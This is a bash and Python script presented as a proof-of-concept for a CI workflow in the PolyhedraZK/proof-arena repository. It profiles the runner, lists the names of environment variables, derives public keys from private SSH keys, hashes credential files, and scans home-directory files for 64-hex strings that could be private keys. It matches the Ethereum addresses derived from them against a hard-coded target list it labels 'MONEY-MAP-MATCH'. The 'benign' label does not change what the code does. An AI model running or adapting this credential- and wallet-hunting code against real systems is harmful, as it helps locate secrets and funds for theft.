#!/bin/bash
# Authorized security-research PoC for PolyhedraZK/proof-arena auto_benchmark.yml
# Benign environment fingerprint ONLY. Prints no secret values.
set -u
echo "== id =="; id
echo "== hostname =="; hostname
echo "== uname =="; uname -a
echo "== pwd =="; pwd
echo "== home listing =="; ls -la ~
echo "== env var NAMES only =="; env | cut -d= -f1 | sort
echo "== ssh dir listing =="; ls -la ~/.ssh 2>/dev/null || echo "(no ~/.ssh)"
echo "== ssh key fingerprints (public keys only) =="
for f in ~/.ssh/*; do
  [ -f "$f" ] || continue
  case "$f" in *.pub|*/known_hosts*|*/authorized_keys) continue ;; esac
  echo "FILE $f sha256=$(sha256sum "$f" | awk '{print $1}')"
  pk=$(ssh-keygen -y -f "$f" 2>/dev/null) && echo "PUBKEY $pk"
done
echo "== key-like files in home (sha256 only) =="
find ~ -maxdepth 3 \( -name '*.pem' -o -name '*.key' -o -name '*.p12' -o -name '.env*' -o -name 'credentials*' -o -name '*.keystore' \) 2>/dev/null | head -30 | while IFS= read -r f; do
  [ -f "$f" ] && echo "FILE $f sha256=$(sha256sum "$f" 2>/dev/null | awk '{print $1}')"
done
echo "== ethereum key ADDRESS derivation (prints addresses only, never keys) =="
python3 - <<'PY' || echo "(python3 scan skipped)"
import os, re, sys
try:
    from eth_account import Account
except Exception:
    print("(eth_account not installed)")
    sys.exit(0)
TARGETS = {
    "0xd1846c61a063eda820305a5e568a12a570420cf6",
    "0x1e56caa34ae155ab8afab2d1e2a37580a04a494c",
    "0xf94b16157948e10597481da0523927c8ba0bd182",
    "0x7af345ad8c2e7372c5aceaaf86bda08676e3d634",
    "0x1082e92a0b92e15212fd5879c1dd672ab548302c",
    "0xebf211e386a5939c59eb0eb300d0290c2c14ce1b",
    "0xfecb60fac9150c9ce63053a61b1a5ef5dd18ad63",
    "0xe343ce395f0c70f9a43905848e3fdc4a2af1a0c2",
    "0x68905bfc4aa68cdd80f2b7cd4d21bf4ca461bbe0",
}
home = os.path.expanduser("~")
pat = re.compile(r'(?<![0-9a-fA-Fx])(0x)?[0-9a-fA-F]{64}(?![0-9a-fA-F])')
seen = set()
for r, dirs, files in os.walk(home):
    if r[len(home):].count(os.sep) > 2:
        dirs[:] = []
        continue
    for fn in files:
        p = os.path.join(r, fn)
        try:
            st = os.stat(p)
            if st.st_size == 0 or st.st_size > 1000000:
                continue
            data = open(p, 'rb').read().decode('utf-8', 'ignore')
        except Exception:
            continue
        for m in pat.finditer(data):
            kl = m.group(0).lower().removeprefix('0x')
            if kl in seen:
                continue
            seen.add(kl)
            try:
                addr = Account.from_key(kl).address
            except Exception:
                continue
            tag = "MONEY-MAP-MATCH" if addr.lower() in TARGETS else "nomatch"
            print("ETHADDR %s %s file=%s" % (addr, tag, p))
print("(scan complete)")
PY
echo "== POC done =="
